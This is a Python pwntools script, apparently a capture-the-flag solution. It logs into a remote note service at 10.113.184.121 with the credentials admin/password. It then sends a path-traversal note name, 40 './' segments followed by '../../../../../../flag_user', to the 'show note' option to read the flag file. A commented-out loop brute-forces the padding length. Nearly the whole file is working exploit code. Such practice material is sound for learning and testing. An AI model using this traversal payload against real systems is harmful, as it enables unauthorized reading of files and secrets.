import sys
from pwn import *
from create_port import create_port

if len(sys.argv) < 2:
    port = create_port()
else:
    port = int(sys.argv[1])

r = remote('10.113.184.121', port)

user = b'admin'
password = b'password'

r.recvuntil(b'> ')
# register
r.sendline(b'2')
r.recvuntil(b'Username: ')
r.sendline(user)
r.recvuntil(b'Password: ')
r.sendline(password)

r.recvuntil(b'> ')
# login
r.sendline(b'1')
r.recvuntil(b'Username: ')
r.sendline(user)
r.recvuntil(b'Password: ')
r.sendline(password)

islogin = r.recvuntil(b'!')

if islogin == b'Login failed!':
    print("Login failed!")
    exit(0)

'''
notename1 = b'../../../../../../flag_user'
notename2 = b'../../../../../../../flag_user'

for i in range(30, 100):
    rvalue = r.recvuntil(b'> ')
    print(rvalue.decode())
    # show note
    r.sendline(b'5')
    r.recvuntil(b'Note Name: ')
    r.sendline(b'./' * i + notename1)
    r.recvuntil(b'Offset: ')
    r.sendline(b'0')

    rvalue = r.recvuntil(b'> ')
    print(rvalue.decode())
    # show note
    r.sendline(b'5')
    r.recvuntil(b'Note Name: ')
    r.sendline(b'./' * i + notename2)
    r.recvuntil(b'Offset: ')
    r.sendline(b'0')
'''

r.recvuntil(b'> ')
# show note
r.sendline(b'5')
r.recvuntil(b'Note Name: ')
r.sendline(b'./' * 40 + b'../../../../../../flag_user')
r.recvuntil(b'Offset: ')
r.sendline(b'0')
flag = r.recvuntil(b'}')
print(flag)
r.close()